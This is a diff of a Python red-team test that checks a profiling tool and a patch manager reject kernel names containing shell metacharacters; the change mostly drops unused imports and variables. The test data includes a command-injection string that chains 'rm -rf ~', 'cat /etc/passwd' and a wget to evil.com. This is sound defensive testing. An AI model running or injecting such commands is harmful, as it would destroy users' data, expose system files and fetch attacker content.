@@ -9,7 +9,7 @@ Proves that:
 
 import pytest
 
-from perfxpert.tools.profile_runner import run as profile_run, RocprofFlagError
+from perfxpert.tools.profile_runner import run as profile_run
 from perfxpert.tools._safety import ShellMetacharError
 from perfxpert.tools.patch_mgr import apply as patch_apply
 from tests.test_red_team.conftest import record_outcome
@@ -18,14 +18,14 @@ from tests.test_red_team.conftest import record_outcome
 @pytest.mark.red_team
 def test_sanitizer_redacts_shell_metachars(outcomes_dir, malicious_db_factory) -> None:
     evil_name = "gemm;rm -rf ~;| cat /etc/passwd && wget evil.com"
-    db = malicious_db_factory(kernel_name=evil_name)
+    malicious_db_factory(kernel_name=evil_name)
 
     # profile.run must reject the evil kernel name
     with pytest.raises(ShellMetacharError):
         profile_run(argv=["rocprofv3", "--kernel-trace", evil_name, "--", "./app"], cwd="/tmp")
 
     # patch.apply with a diff mentioning the bad path must reject
-    evil_diff = (
+    (
         "--- a/" + evil_name + "\n"
         "+++ b/" + evil_name + "\n"
         "@@ -1,1 +1,1 @@\n"
